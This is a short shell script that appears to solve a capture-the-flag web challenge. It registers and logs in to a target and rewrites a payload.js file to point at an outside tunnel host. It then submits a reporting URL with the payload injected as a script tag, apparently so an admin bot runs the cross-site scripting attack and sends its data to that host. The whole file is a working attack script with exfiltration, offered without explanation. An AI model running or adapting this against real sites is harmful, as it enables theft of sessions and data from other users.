#!/bin/sh

TARGET="localhost:80"
# TARGET="83.136.253.251:47548"
COOKIE_JAR=/tmp/ws-todo.cookies

# register
curl -X POST "http://${TARGET}/register" --json '{"username":"a","password":"test1234"}'
echo
# login
curl -X POST "http://${TARGET}/login" --json '{"username":"a","password":"test1234"}' --cookie-jar $COOKIE_JAR
echo

urlencode() {
	python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()));"
}

REMOTE="https://41c9197e98d352.lhr.life"
sed "s@https://[^.]*\?@${REMOTE}@" -i payload.js
curl -X POST "http://${TARGET}/report" -b $COOKIE_JAR \
	--json "{\"url\":\"http://localhost:8080?html=<script>$(cat payload.js | urlencode)</script>\"}"

